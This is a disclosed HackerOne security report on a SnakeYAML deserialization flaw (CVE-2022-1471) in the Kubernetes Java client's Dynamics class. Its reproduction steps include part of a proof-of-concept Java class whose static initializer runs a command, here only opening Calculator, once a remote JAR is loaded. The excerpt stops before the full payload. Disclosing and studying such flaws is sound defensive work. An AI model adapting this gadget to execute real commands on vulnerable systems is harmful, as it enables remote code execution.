# [M] The `io.kubernetes.client.util.generic.dynamic.Dynamics` contains a code execution vulnerability due to SnakeYAML

## Summary
Severity: Medium (CVSS 6.7)
Program: Kubernetes
Weakness: Code Injection
Reporter: jlleitschuh
State: resolved
Disclosed: 2023-04-25T16:44:21.223Z
CVE: CVE-2022-1471
Source: https://hackerone.com/reports/1807214

## Details
## Summary:

If the `io.kubernetes.client.util.generic.dynamic.Dynamics` is used to deserialize a `DynamicKubernetesObject `from untrusted YAML, an attacker can achieve code execution inside of the JVM.

Since this is a part of the public API, down stream consumers can be using this API in a way that leaves them vulnerable. I have found no users of this class on GitHub outside of this project's unit tests. But that doesn't mean there are no users of this API. Someone built it for a reason, right?

## Component Version:

Kubernettes Java Client version 17.0.0

## Steps To Reproduce:

1. Host a server with a JAR file containing the following code: 
```java
package org.jlleitschuh.sandbox;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class ScriptEngineFactoryRCE implements ScriptEngineFactory {
    static {
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec("open -a Calculator");
            p.waitFor();
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1807214_
